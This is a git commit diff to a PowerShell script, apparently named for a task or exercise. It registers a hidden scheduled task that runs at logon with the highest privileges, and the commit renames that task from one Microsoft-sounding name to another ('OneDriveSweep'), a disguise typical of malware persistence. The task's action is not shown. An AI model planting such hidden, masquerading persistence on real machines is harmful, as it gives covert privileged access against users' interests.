ee5ee98ab92b1b475cad9586d380bda6df85ecd8
skekic16 <151707511+skekic16@users.noreply.github.com>
2023-12-29 16:35:28 -0600

    Update task2.ps1

--- task2.ps1
+++ task2.ps1
@@ -3,4 +3,4 @@ $trigger = New-ScheduledTaskTrigger -AtLogon
 $principal = New-ScheduledTaskPrincipal -UserID 'DOMAIN\user' -RunLevel Highest
 $settings = New-ScheduledTaskSettingsSet -Hidden -RunOnlyIfNetworkAvailable
 $task = New-ScheduledTask -Action $action -Principal $principal -Trigger $trigger -Settings $settings
-Register-ScheduledTask T1 -InputObject $task -Force -TaskName MicrosoftCleanhouse -User $env:UserName
+Register-ScheduledTask T1 -InputObject $task -Force -TaskName OneDriveSweep -User $env:UserName
